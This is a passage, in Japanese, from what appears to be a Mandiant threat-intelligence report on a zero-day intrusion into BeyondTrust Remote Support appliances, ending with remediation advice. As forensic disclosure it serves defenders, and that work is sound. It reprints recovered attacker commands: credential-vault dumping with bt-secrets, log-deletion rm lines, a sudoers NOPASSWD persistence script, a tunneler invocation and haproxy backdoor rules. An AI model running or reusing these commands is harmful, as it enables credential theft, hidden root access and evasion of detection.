見つかりません」（</span><code style=\"vertical-align: baseline;\">http_response_code(404)</code><span style=\"vertical-align: baseline;\">）を設定し、自動ウェブクローラや脆弱性スキャナを回避するために終了します。</span><code style=\"vertical-align: baseline;\">_c94mfe</code><span style=\"vertical-align: baseline;\"> パラメータが指定されている場合、ウェブシェルはペイロードを Base32 でデコードし、ハードコードされた 32 バイトの鍵を使用して RC4 で復号してから、結果の PHP コードを </span><code style=\"vertical-align: baseline;\">@eval()</code><span style=\"vertical-align: baseline;\"> で実行します。評価されたコードから返される null 以外の値は、同じ鍵を使って RC4 で暗号化され、Base32 でエンコードされて、クライアントにエコーバックされます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">SUID ビット権限による権限昇格</strong></p>\n<p><span style=\"vertical-align: baseline;\">SAWFLY ウェブシェルは、サイトのサービス アカウント（権限のないローカル ユーザー）で実行されました。脅威アクターは、権限を昇格させるために、システムシェルの実行可能ファイル（</span><code style=\"vertical-align: baseline;\">/bin/sh</code><span style=\"vertical-align: baseline;\">）をファイル </span><code style=\"vertical-align: baseline;\">/usr/bin/dbus-authd</code><span style=\"vertical-align: baseline;\"> にコピーしました。</span></p>\n<p><span style=\"vertical-align: baseline;\">その後、脅威アクターはファイルの所有権を root に変更し、Set User ID（SUID）ビットを設定しました。バイナリで SUID 権限が有効になっている場合、コマンドを実行するユーザーではなく、ファイルの所有者（root）の権限で実行されるため、結果的に、ホストシステムへの永続的な root レベルのバックドア アクセスが脅威アクターに許可されました。</span></p>\n<p><span style=\"vertical-align: baseline;\">ウェブシェルを介して足がかりを確立した後、アクターはウェブ サービス アカウントからアプライアンス ホストの root レベルの制御に昇格しました。これにより、アプライアンスが保存または仲介するすべての認証情報にアクセスし、ファイルを変更できるようになりました。これは、再起動や構成のリセット後も維持されます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">認証情報の収集: BeyondTrust Vault の抽出</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターがアプライアンスのネイティブ シークレット管理データベースから認証情報を直接収集しようと試みていたことを確認しました。アクターはその際に </span><code style=\"vertical-align: baseline;\">/ns/sbin/bt-secrets</code><span style=\"vertical-align: baseline;\"> バイナリを利用していました。これは、BeyondTrust アプライアンスにネイティブの独自の管理コマンドライン インターフェース（CLI）ユーティリティであり、パスワード、API キー、エンドポイント認証情報の管理、保存、取得に使用されているものです。</span></p>\n<p><span style=\"vertical-align: baseline;\">脅威アクターは、アプライアンスの認証情報 Vault を特定してダンプするために、いくつかの CLI 構文のバリエーションを体系的に繰り返していました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault\n/ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault\n/ns/sbin/bt-secrets get vault\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 2: メッセージ ログから復元されたコマンド</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">脅威アクターは最初に、特定のサイトのサービス アカウント用 Vault を標的にして、そのプロファイル専用に割り当てられたパスワードと鍵を取得しようとしました。</span></p>\n<p><span style=\"vertical-align: baseline;\">次に、フォールバック コマンドを実行して、グローバルなアプライアンス レベルのパスワード セーフを標的にして、保存されている管理者の認証情報をすべてダンプしました。</span></p>\n<p><span style=\"vertical-align: baseline;\">そして、</span><code style=\"vertical-align: baseline;\">/home/bomgar/log/bt-secrets.log</code><span style=\"vertical-align: baseline;\"> に保存されたレコードとアーカイブ ファイルを強制的に削除して、bt-secrets バイナリとのやり取りを終了しました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2&gt;/dev/null;'</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 3: メッセージ ログから復元されたコマンド</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">永続性</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターが長期的な永続アクセスを目的として、BeyondTrust 構成テンプレートを標的にし、サイトのサービス アカウントにパスワードなしの root 権限を付与したことを確認しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">脅威アクターは最初に </span><code style=\"vertical-align: baseline;\">/home/bomgar/sbin/post_boot.d</code><span style=\"vertical-align: baseline;\"> ディレクトリを作成しました。このディレクトリは、システム起動時に自動的に実行されるスクリプト用に予約されているものです。このディレクトリ内に、</span><code style=\"vertical-align: baseline;\">zz-root-persist</code><span style=\"vertical-align: baseline;\"> という名前のシェル スクリプトを作成しました。</span></p>\n<p><code style=\"vertical-align: baseline;\">zz-root-persist</code><span style=\"vertical-align: baseline;\"> スクリプトの内容を見ると、まず </span><code style=\"vertical-align: baseline;\">/ns/config/sudoers.template</code><span style=\"vertical-align: baseline;\"> ファイル内で、ユーザー アカウントにパスワードなしの root 権限がすでに付与されているかどうかを確認しています。エントリがない場合、スクリプトは </span><code style=\"vertical-align: baseline;\">'%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL'</code><span style=\"vertical-align: baseline;\"> をテンプレートに追加します。sudoers テンプレートに追加されたこのエントリにより、サイトのユーザー アカウントに、ホストシステムで任意のコマンドを実行するためのパスワードなしの管理者権限が付与されます。</span></p>\n<p><span style=\"vertical-align: baseline;\">最後に、スクリプトは </span><code style=\"vertical-align: baseline;\">'/ns/sbin/bt-sysconfig' --no-restart misc</code><span style=\"vertical-align: baseline;\"> を実行します。これは、アプライアンスのバックエンドに、</span><code style=\"vertical-align: baseline;\">/ns/config/sudoers.template</code><span style=\"vertical-align: baseline;\"> を直ちに解析して、アクティブな </span><code style=\"vertical-align: baseline;\">/etc/sudoers</code><span style=\"vertical-align: baseline;\"> ファイルを再構築するよう強制するものです。この戦略により、脅威アクターの権限昇格は、システムの再起動や構成のリセット後も維持されます。通常、システムの再起動や構成のリセットを行うと、</span><code style=\"vertical-align: baseline;\">/etc/sudoers</code><span style=\"vertical-align: baseline;\"> に直接加えられた手動の変更は上書きされます。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>#!/bin/bash\ngrep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' &gt;&gt; '/ns/config/sudoers.template'\n'/ns/sbin/bt-sysconfig' --no-restart misc\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"> <span style=\"font-style: italic; vertical-align: baseline;\">図 4: zz-root-persist の内容</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">フォレンジック対策</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターがアプライアンスへの不正アクセスを通じて、システム、ウェブサーバー、アプリケーション レベルのログを体系的に削除することで、防御を損ない、検出を妨げようとした複数のケースを確認しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">脅威アクターは、SAWFLY ウェブシェルから、昇格した sudo 権限を使用して次のコマンドを実行し、ホストとサイト固有のディレクトリの両方でアクティビティ ログを削除しました。</span></p>\n<pre class=\"language-markup\"><code>'rm -f \\'/ns/log/auth.log\\' \\'/ns/log/ssl.log\\' \\'/ns/log/proto-handler.log\\' \\'/ns/log/bt-docker.log\\' \\'/ns/log/http-access.log\\' \\'/ns/log/http-errors.log\\' \\'/ns/log/php-fpm.log\\' \\'/ns/log/php-fpm-access.log\\' \\'/ns/log/php_debug.log\\' \\'/ns/log/php_web_errors.log\\' \\'/var/log/messages\\' \\'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\\' \\'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\\' /tmp/sshauth.*'\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 5: 復元されたコマンド</span></span></span></p>\n<p><span style=\"vertical-align: baseline;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">ラテラル ムーブメント: BeyondTrust 管理者セッションの不正使用</strong></p>\n<p><span style=\"vertical-align: baseline;\">脅威アクターは、BeyondTrust デバイスを侵害した後、BeyondTrust Remote Support アプリケーションにピボットし、不正に入手した管理者の認証情報を使用して偵察を行いました。脅威アクターはまず、管理者アカウントを利用してウェブ管理ポータルにログインしました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>{\n  \"event\": \"login\",\n  \"status\": \"success\",\n  \"target\": \"web/login\",\n  \"who\": \"[REDACTED_USERNAME] using password\",\n  \"who_ip\": \"[REDACTED_IP]\"\n}\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 6: BeyondTrust Syslog エントリ</span><br /><br /></span></span></p>\n<p><span style=\"vertical-align: baseline;\">脅威アクターはその後、初期アクセスをテストし、ネイティブの Administrators グループ ポリシーに一時的に参加できることを確認した後、長期的な永続化のために戦略を変更しました。アクターは、侵害したアカウントの権限を直接変更し、ローカルの Jump Item とチームの権限の両方を「</span><code style=\"vertical-align: baseline;\">No Access</code><span style=\"vertical-align: baseline;\">」から「</span><code style=\"vertical-align: baseline;\">Administrator</code><span style=\"vertical-align: baseline;\">」にアップグレードしました。Jump Item は、Jump Group 内でリモート アクセスを可能にした個々のシステムまたはデバイスであり、管理者がリモート システムへのアクセスを整理、管理できるようにするものです。この構成の変更により、脅威アクターは、アプライアンスの Jump Item リストに登録されているダウンストリーム システムへのリモート セッションを起動する、永続的かつ無制限の権限を取得しました。</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"> </span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>{\n  \"event\": \"user_changed\",\n  \"old_username\": \"[REDACTED]\",\n  \"old_permissions:jump_item_role:default:id\": 1,\n  \"new_permissions:jump_item_role:default:id\": 3,\n  \"old_permissions:jump_item_role:default:name\": \"No Access\",\n  \"new_permissions:jump_item_role:default:name\": \"Administrator\",\n  \"old_permissions:jump_item_role:teams:id\": 1,\n  \"new_permissions:jump_item_role:teams:id\": 3,\n  \"old_permissions:jump_item_role:teams:name\": \"No Access\",\n  \"new_permissions:jump_item_role:teams:name\": \"Administrator\"\n}\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 7: BeyondTrust Syslog エントリ</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">内部偵察</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターが昇格した管理者権限を取得した後、リモート サポート セッションを確立して、内部エンドポイントを標的にしたことを確認しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">接続が確立されると、脅威アクターはアプライアンスに組み込まれているサポートツールを利用して、ファイル システムへのフルアクセスをリクエストし、取得しました。その後、BeyondTrust Remote Support のネイティブ ファイル転送サービスを利用して、ソフトウェア インベントリなど、ネットワーク偵察に役立つ機密性の高い内部ドキュメントをユーザーのデスクトップ環境から直接ダウンロードして引き出しました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">BARECLAW トンネラー</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターがカスタム SOCKS5 プロキシ トンネラーを使用して、BeyondTrust デバイスを通過するトラフィックをトンネリングしたことを確認しました。BARECLAW は C 言語で記述されたトンネラーであり、WebSocket トランスポートを介して運ばれる SOCKS5 プロキシ サービスを提供し、リモート クライアントと宛先間の TCP 接続を中継します。BARECLAW は、静的に埋め込まれた CivetWeb WebServer を利用して HTTP と WebSocket の機能を提供し、TLS に OpenSSL を利用します。BARECLAW は構成可能で、認証を必須とすること、クライアントとトンネラー間のデータを暗号化すること、到達可能な宛先を特定の CIDR の範囲に制限すること、トラフィックをアップストリーム プロキシに転送すること、そしてデフォルトの WebSocket エンドポイントとリスニング ポートを変更することが可能です。TLS は PEM 証明書を提供することで有効になります。認証、暗号化、宛先フィルタリング、TLS はデフォルトで無効になっています。</span></p>\n<p><span style=\"vertical-align: baseline;\">BARECLAW は CLI 入力から構成を受け取り、CLI オプション メニューを提供します。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>Usage: %s [options]\n  --listen PORT            plain ws port (default 8080)\n  --listen-tls PORT        wss port (default 8443, needs --ssl-cert)\n  --ssl-cert FILE          PEM certificate (enables wss)\n  --token STRING           shared secret (?token= auth + obfs seed)\n  --obfs                   enable XOR stream obfuscation\n  --timeout SEC            idle timeout (default 300)\n  --connect-timeout SEC    target connect timeout (default 10)\n  --max-tunnels N          concurrent tunnel limit (default 100)\n  --allow-net CIDR         allowed target subnet (repeatable)\n  --upstream [socks5://]host:port   route via upstream SOCKS5\n  --threads N              civetweb worker threads (default 64)\n  --ws-path PATH           websocket endpoint path (default /wsproxy)\n  -q, --quiet              zero output (all logging suppressed)\n  -h                       this help\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 8: BARECLAW の CLI オプション メニュー</span></span></span></p>\n<p><span style=\"color: #5f6368; display: block; font-size: 16px; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">脅威アクターは、次のコマンドライン引数を使用して BARECLAW を実行しました。</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 9: BARECLAW の全コマンドライン引数</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">このコマンドラインは、TCP ポート 19800 でリッスンし、被害者のシステムに WebSocket エンドポイント </span><code style=\"vertical-align: baseline;\">/uidchanarge</code><span style=\"vertical-align: baseline;\"> を作成するよう BARECLAW を構成しています。また、コマンドライン引数で指定するトークンを認証に使用することをクライアントに求め、-q 引数でトンネラーのロギングを抑制しています。トンネリングされたデータは、そのトークンと、セッションの開始時にクライアントから提供された 8 バイトの値から導出された XOR ベースのルーチンで暗号化されます。CLI オプションに --ssl-cert と --listen-tls の引数がないということは、この特定のインスタンスで TLS が有効になっていなかったことを意味します。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">Haproxy.conf の変更</strong></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、脅威アクターが BARECLAW トンネラーを作成しただけでなく、BARECLAW にインターネットから直接アクセスできるように </span><code style=\"vertical-align: baseline;\">/ns/config/haproxy.conf</code><span style=\"vertical-align: baseline;\"> ファイルを変更したことも確認しました。BeyondTrust デバイスで動作する HAProxy サービスは、デバイスのリバース プロキシとして機能し、BeyondTrust サーバーに代わって受信リクエストを受け入れ、リクエストのポートまたは URL パスに基づいて、ローカル システムで実行されている適切なバックエンド サービス（ウェブ インターフェース、管理ポータル、アプリケーション ゲートウェイなど）にリクエストを転送するものです。</span></p>\n<p><code style=\"vertical-align: baseline;\">haproxy.conf</code><span style=\"vertical-align: baseline;\"> ファイルは、BeyondTrust アプライアンスが受信トラフィックを処理、ルーティング、保護する方法を指示する、主要な構成ファイルです。脅威アクターが変更した内容として、まず、特定の URI パス </span><code style=\"vertical-align: baseline;\">/uidchanarge</code><span style=\"vertical-align: baseline;\"> への受信トラフィックをモニタリングする、</span><code style=\"vertical-align: baseline;\">wswsws</code><span style=\"vertical-align: baseline;\"> という名前のアクセス制御リスト（ACL）が確立されました。このパスに一致するリクエストが検出されると、HAProxy は通常のアプライアンス ウェブサービスをバイパスし、</span><code style=\"vertical-align: baseline;\">webskd3</code><span style=\"vertical-align: baseline;\"> というカスタム バックエンドにトラフィックをルーティングします。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>    acl wswsws path /uidchanarge\n    use_backend webskd3 if wswsws\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 10: haproxy.conf における ACL の変更</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">次に、</span><code style=\"vertical-align: baseline;\">webskd3</code><span style=\"vertical-align: baseline;\"> バックエンドが、受信したウェブ ストリームをローカル（127.0.0.1 / localhost）で TCP ポート 19800 にルーティングします。このポートでは、BARECLAW ユーティリティがアクティブにリッスンしています。このローカル専用バインディングにより、バックドア リスナーは HAProxy のローカル リダイレクトを介して内部からのみアクセスできるため、外部ネットワーク スキャンから完全に隠蔽されます。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>backend webskd3\n    mode http\n    server websocks5srv 127.0.0.1:19800\n    option http-keep-alive\n    timeout server 28s\n    timeout tunnel 5h\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">図 11: haproxy.conf におけるバックエンド ルートの変更</span></span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">アトリビューション</strong></p>\n<p><span style=\"vertical-align: baseline;\">GTIG は、CVE-2026-102764 のゼロデイ攻撃と、それに続く SAWFLY および BARECLAW のデプロイを、中国との関連が疑われるサイバースパイ アクター ARMORY CASTLE（以前は UNC5221 として追跡）によるものと特定しています。この侵入で使用されたツールと TTP は、以前に確認された ARMORY CASTLE の活動と一致しています。</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG は以前、ARMORY CASTLE がエッジ アプライアンスの複数の脆弱性を悪用し、パッシブ バックドアやウェブシェルからエッジデバイスのトロイの木馬化されたコンポーネントまで、目的をサポートする広範なカスタムツールのスイートをデプロイしていることを</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability?e=0\"><span style=\"text-decoration: underline; vertical-align: baseline;\">報告</span></a><span style=\"vertical-align: baseline;\">しました。ARMORY CASTLE は 2023 年 10 月から活動しており、これまでにさまざまな国や業種を標的にしてきました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">見通しと影響</strong></p>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は、過去のキャンペーンで、ゼロデイとして選択的に悪用していた脆弱性が公表された後、それを広範囲にわたって日和見的に悪用し、パッチが適用される前に標的組織に侵入しようとしました。そのため、CVE-2026-102764 に関しても、同様の広範な悪用の試みが確認される可能性があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG は、ARMORY CASTLE がサイバースパイの目的を達成するために、今後もエッジデバイスのゼロデイ脆弱性を利用して環境へのアクセスを獲得し続けると高い確信を持って評価しています。防御側は、CVE-2026-102764 の公表後にも、2024 年の CVE-2023-46805 と CVE-2024-21887 の公表後に GTIG が</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day\"><span style=\"text-decoration: underline; vertical-align: baseline;\">確認</span></a><span style=\"vertical-align: baseline;\">したものと同様の広範な悪用を ARMORY CASTLE が行う可能性に備える必要があります。</span></p>\n<p><strong style=\"vertical-align: baseline;\">修復とセキュリティ強化</strong></p>\n<p><a href=\"https://www.beyondtrust.com/trust-center/security-advisories/bt26-05\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BT26-05 パッチ</span></a><span style=\"vertical-align: baseline;\">をまだ適用していない組織は、直ちに影響とリスクを評価し、BeyondTrust の</span><a href=\"https://www.beyondtrust.com/blog/entry/bt26-05\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ブログ</span></a><span style=\"vertical-align: baseline;\">に記載されている追加のガイダンスを確認する必要があります。CVE-2026-102764 は、サポートされているすべての Remote Support バージョン（26.2.3 まで）に影響します。認証されていないリモート攻撃者がアプライアンス上でファイル操作を実行できるため、ホストレベルの制御や、アプライアンスが保存または仲介するすべての認証情報へのアクセスにつながる可能性があります。脆弱性のあるバージョンで、悪用が可能な期間中にインターネットからアクセス可能だったアプライアンスは、確認が完了するまで、侵害された可能性があるものとして扱う必要があります。Mandiant は、封じ込めとサポート対応の中断のバランスを取りながら、パッチ適用を優先する段階的なアプローチを推奨しています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">即時の緩和</strong></p>\n<p><span style=\"vertical-align: baseline;\">組織は、リスク許容度、侵害の証拠、運用上のニーズに基づいて、次のオプションから選択する必要があります。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">オプション 1: BT26-05 パッチを適用する（Mandiant 推奨）</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Remote Support SaaS</strong><span style=\"vertical-align: baseline;\">: 2026 年 10 月 9 日に、BeyondTrust がすべての SaaS テナントにパッチを適用済みです。アプライアンス自体について、お客様による対応は必要ありません。ただし、オプション 3 の認証情報と構成の手順は依然必要です。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">セルフホスト型、バージョン 24.3.1 以降</strong><span style=\"vertical-align: baseline;\">: </span><code style=\"vertical-align: baseline;\">/appliance</code><span style=\"vertical-align: baseline;\"> インターフェースから BT26-05-RS パッチを適用するか、アプライアンスが自動更新に登録されている場合は、パッチが自動的に適用されたことを確認します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">セルフホスト型、24.3.1 より前のバージョン</strong><span style=\"vertical-align: baseline;\">: サポート対象のバージョンにアップグレードしてから、パッチを適用します。アップグレードすると脆弱性は解消されますが、それ以前に受けた影響は修復されません。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">/appliance</code><span style=\"vertical-align: baseline;\"> にパッチが表示されない場合は、BT26-05 を指定して BeyondTrust サポートにケースを登録してください。</span></p>\n</li>\n</ul>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">オプション 2: 侵害された、または侵害が疑われるアプライアンスを隔離する</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">対応前に保存する</strong><span style=\"vertical-align: baseline;\">: 変更や再起動を行う前に、メモリを含む仮想アプライアンスのスナップショットを作成し、ディスクをエクスポートします。B シリーズのハードウェアと SaaS テナントの場合は、BeyondTrust サポートを通じてフォレンジック保存をリクエストしてください。ホストにアクセスできる攻撃者はアプライアンス上のログを削除できるため、脆弱性がインターネットに露出していた期間中の syslog、リバース プロキシまたは WAF、境界ファイアウォールのログを収集します。Mandiant は、アクターがインシデント期間中のログを削除していたことを確認しています。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">境界で隔離する</strong><span style=\"vertical-align: baseline;\">: アプライアンスのパブリック アドレスへのインバウンド トラフィックは、</span><code style=\"vertical-align: baseline;\">/appliance</code><span style=\"vertical-align: baseline;\"> ではなくファイアウォールでブロックします。これにより、構成はそのまま残り、後で確認できます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">外向きトラフィックを制限する</strong><span style=\"vertical-align: baseline;\">: BeyondTrust のアップデートとライセンスのエンドポイントへのトラフィックを除き、アウトバウンド トラフィックを拒否し、拒否されたすべての接続をログに記録します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">アクセスパスを終了する</strong><span style=\"vertical-align: baseline;\">: </span><code style=\"vertical-align: baseline;\">/login</code><span style=\"vertical-align: baseline;\"> から、アクティブなサポート セッションを終了し、新しいセッション、Jump Client、Jumpoint、API アカウントを無効にします。削除ではなく無効化することで、監査証跡が残ります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">クリーンアップではなく再構築する</strong><span style=\"vertical-align: baseline;\">: 侵害が確認された、または侵害ステータスが不明なアプライアンスを、完全にパッチが適用されたクリーンなイメージから再デプロイします。お客様はアプライアンスのホスト ファイル システムを監査できません。また、ホストレベルの永続性は再起動や構成のリセット後も維持されます。露出期間より前の日付の構成バックアップのみを復元するか、隔離された状態で最新のバックアップを復元し、オプション 3、パート B の確認を完了してから、再接続します。新しい TLS 証明書を発行し、再構築したアプライアンスから Jump Client、Jumpoint、担当者向けコンソールを再デプロイします。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">注</strong><span style=\"vertical-align: baseline;\">: 隔離やセッションの終了を行うと、サポート対応が中断されます。組織は、続行する前にヘルプデスクやベンダー サポートの関係者と調整を行う必要があります。</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">オプション 3: ターゲットを絞った補完的な制御を適用する</strong></p>\n<p><span style=\"vertical-align: baseline;\">以下の制御により、露出を減らし、侵害後の影響を制限できます。これらはパッチの代わりにはなりません。</span></p>\n<p><strong style=\"vertical-align: baseline;\">パート A: ネットワークの制限</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">アプライアンス レベルで、IP またはネットワーク セグメントによって管理インターフェース </span><code style=\"vertical-align: baseline;\">/login</code><span style=\"vertical-align: baseline;\"> と </span><code style=\"vertical-align: baseline;\">/appliance</code><span style=\"vertical-align: baseline;\"> へのアクセスを制限します。インターネットからアクセスできるのは、担当者向けコンソール、カスタマー ポータル、Jump Client のトラフィックのみにする必要があります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">運用上可能な場合は、アプライアンスの前に完全な URI ロギングを備えたリバース プロキシまたは WAF を配置して、アプライアンスが変更できないリクエストパスの記録をとります。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">パート B: 認証情報のローテーションと構成の確認</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">セッションと登録を取り消す</strong><span style=\"vertical-align: baseline;\">: すべてのアクティブなサポート セッションを終了し、パッチ適用済みまたは再構築済みのアプライアンスから Jump Client、Jumpoint、担当者向けコンソールを再デプロイして、既存のトークンを無効にします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">依存関係の順に認証情報をローテーションする</strong><span style=\"vertical-align: baseline;\">: </span><code style=\"vertical-align: baseline;\">/appliance</code><span style=\"vertical-align: baseline;\"> 管理者の認証情報、/login 管理者とローカル ユーザー、API クライアント シークレット、セキュリティ プロバイダのバインド アカウントと SAML 署名鍵、Remote Support Vault と統合された Password Safe または Privileged Remote Access（PRA）認証情報（ターゲット システムでローテーション）、統合認証情報（SMTP、syslog、情報技術サービス管理（ITSM）コネクタ、アウトバウンド イベントのシークレット）、期間中にサポート セッションに入力された認証情報。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">/login 構成を対象期間前のベースラインに照らして確認する</strong><span style=\"vertical-align: baseline;\">: ユーザーとロールの変更、特に管理者権限に昇格された Jump Item ロール、グループとセッションのポリシー、API アカウント、セキュリティ プロバイダ、Jump Item と Jumpoint、アウトバウンド イベントまたは syslog の宛先。変更記録や所有者名のないものはすべて削除します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">サポート セッションのレポートを確認する:</strong><span style=\"vertical-align: baseline;\"> ファイル転送を含む期間中のレポートを確認し、どのエンドポイントにアクセスされ、何が残されたかを特定します。アクセスされたすべてのエンドポイントが、ダウンストリーム ハンティングの対象となります。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">注</strong><span style=\"vertical-align: baseline;\">: 認証情報のローテーションは、アプライアンスのパッチ適用か再構築の後で行ってください。それより前にローテーションを行うと、新しい認証情報が、アプライアンスをまだ制御している攻撃者に開示されます。</span></p>\n<p><strong style=\"vertical-align: baseline;\">パート C: コントロール プレーンの制限</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">すべての </span><code style=\"vertical-align: 